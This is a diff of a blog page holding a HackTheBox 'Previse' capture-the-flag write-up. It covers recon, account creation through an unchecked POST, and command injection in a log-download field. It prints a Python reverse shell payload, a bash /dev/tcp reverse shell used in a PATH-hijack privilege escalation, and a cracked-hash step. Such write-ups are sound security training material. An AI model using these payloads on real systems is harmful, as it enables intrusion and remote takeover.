@@ -21,18 +21,31 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"fre4k5en.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="Information Gathering1nmap -sC -sV 10.129.95.185    Access website through port 80, find out there is a login page and no result for Bruteforce, so I change my mind to scan website dirctory.">
+<meta name="description" content="Information Gathering1nmap -sC -sV 10.129.95.185   Access website through port 80, find out there is a login page and no result for Bruteforce, so I change my mind to scan website dirctory.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HackTheBox--Previse">
 <meta property="og:url" content="https://fre4k5en.com/2021/11/04/HackTheBox-Previse/index.html">
 <meta property="og:site_name" content="最后的家">
-<meta property="og:description" content="Information Gathering1nmap -sC -sV 10.129.95.185    Access website through port 80, find out there is a login page and no result for Bruteforce, so I change my mind to scan website dirctory.">
+<meta property="og:description" content="Information Gathering1nmap -sC -sV 10.129.95.185   Access website through port 80, find out there is a login page and no result for Bruteforce, so I change my mind to scan website dirctory.">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/qi6VJyjOsg8TlRx.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/TCld1m35kWUiYtn.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/Afxp6R4OaLkHJIP.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/zCAobfEetwd4lGx.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/THVJAgezdUnRom6.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/4NM7w6qUtuTAZas.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/L7Gc3lFtqPNIo4k.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/16WY9ApsTM3lSRt.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/VvmMszEPnex3lZw.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/MdJC3mejhuoW6Pc.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/FlfqE4do3hCJIGu.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/05/dSsLq5lcPGHv1mk.png">
 <meta property="article:published_time" content="2021-11-04T07:39:29.000Z">
-<meta property="article:modified_time" content="2021-11-04T09:37:58.477Z">
+<meta property="article:modified_time" content="2021-11-05T09:12:47.545Z">
 <meta property="article:author" content="Fre4k5en">
 <meta property="article:tag" content="Writeup">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/05/qi6VJyjOsg8TlRx.png">
 
 
 <link rel="canonical" href="https://fre4k5en.com/2021/11/04/HackTheBox-Previse/">
@@ -149,7 +162,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Information-Gathering"><span class="nav-text">Information Gathering</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#User-flag"><span class="nav-text">User flag</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Information-Gathering"><span class="nav-text">Information Gathering</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#User-flag"><span class="nav-text">User flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Root-Flag"><span class="nav-text">Root Flag</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -240,10 +253,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2021-11-04 15:39:29 / Modified: 17:37:58" itemprop="dateCreated datePublished" datetime="2021-11-04T15:39:29+08:00">2021-11-04</time>
+      <time title="Created: 2021-11-04 15:39:29" itemprop="dateCreated datePublished" datetime="2021-11-04T15:39:29+08:00">2021-11-04</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-11-05 17:12:47" itemprop="dateModified" datetime="2021-11-05T17:12:47+08:00">2021-11-05</time>
+      </span>
 
   
 </div>
@@ -257,14 +276,18 @@
     <div class="post-body" itemprop="articleBody">
         <h4 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV <span class="number">10.129.95.185</span></span><br></pre></td></tr></table></figure>
 
-
-
+<p><img src="https://i.loli.net/2021/11/05/qi6VJyjOsg8TlRx.png" alt="nmap"></p>
 <p>Access website through port 80, find out there is a login page and no result for Bruteforce, so I change my mind to scan website dirctory.</p>
+<p><img src="https://i.loli.net/2021/11/05/TCld1m35kWUiYtn.png" alt="dirb"></p>
 <span id="more"></span>
 
+<p><img src="https://i.loli.net/2021/11/05/Afxp6R4OaLkHJIP.png" alt="website"></p>
 <h4 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h4><p>Noticed that there are many pages status code is 302 but nav.php is 200.</p>
+<p><img src="https://i.loli.net/2021/11/05/zCAobfEetwd4lGx.png" alt="nav"></p>
 <p>But every page needs to login, so I use BurpSuite to check these page want to find a footfold. Then I find account.php has a create account function, but it doesn’t check strictly user privilege. So I can create a POST request to create my own account.</p>
+<p><img src="https://i.loli.net/2021/11/05/THVJAgezdUnRom6.png" alt="account"></p>
 <p>Now I can login with my account, after look around every URL, I find a dangerous code area in source code logs.file which can be download in file.php</p>
+<p><img src="https://i.loli.net/2021/11/05/4NM7w6qUtuTAZas.png" alt="logs"></p>
 <p>There is a dangerous usage of exec that cause a RCE. Now I can modify the request package and execute my command.</p>
 <p>Listening on local 9999</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvnp <span class="number">9999</span></span><br></pre></td></tr></table></figure>
@@ -273,10 +296,29 @@
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> /logs.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">10.129.95.185</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">9</span></span><br><span class="line"><span class="attribute">Cache</span>-Control: max-age=<span class="number">0</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">Origin</span>: http://<span class="number">10.129.95.185</span></span><br><span class="line"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win<span class="number">64</span>; x<span class="number">64</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">94</span>.<span class="number">0</span>.<span class="number">4606</span>.<span class="number">81</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b<span class="number">3</span>;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Referer</span>: http://<span class="number">10.129.95.185</span>/file_logs.php</span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=mf<span class="number">6</span>socg<span class="number">3</span>i<span class="number">7</span>adog<span class="number">9</span>i<span class="number">9</span>rj<span class="number">0</span>fn<span class="number">1</span>jbk</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="attribute">delim</span>=tab; /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.14.26&quot;</span>,<span class="number">9999</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>Now I get a shell of www-data, use MySQL user/pass in config.php to find some information in MySQL</p>
+<p><img src="https://i.loli.net/2021/11/05/L7Gc3lFtqPNIo4k.png" alt="mysql"></p>
 <p>Find a password cyphertext <code>$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.</code> </p>
 <p>I’m so confused at first why there is an emoji in cyphertext, but I find source code in accounts.php after.</p>
+<p><img src="https://i.loli.net/2021/11/05/16WY9ApsTM3lSRt.png" alt="account_cypher"></p>
 <p>I find cleartext after many tries, the cypher method calls MD5Cypher in hashcat mode 500</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$1</span><span class="variable">$</span>🧂llol<span class="variable">$DQpmdvnb7EeuO6UaqRItf</span>.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/11/05/VvmMszEPnex3lZw.png" alt="cypher"></p>
 <p>Use this user/pass I connect the user m4lwhere via SSH</p>
+<h4 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/11/05/MdJC3mejhuoW6Pc.png" alt="sudo"></p>
+<p>Although I can not modify this script, I can change my enviroment varible, so I add my $home path to $PATH</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=/home/m4lwhere:$PATH</span><br><span class="line">echo <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p>Then I create a fake program named gzip in home path, so that the script will execute it which have my own command init.</p>
+<p><img src="https://i.loli.net/2021/11/05/FlfqE4do3hCJIGu.png" alt="bash"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.14.3/</span><span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>And now what I need is listening and excute the script</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="regexp">/opt/</span>scripts/access_backup.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/11/05/dSsLq5lcPGHv1mk.png" alt="root"></p>
 
     </div>
 
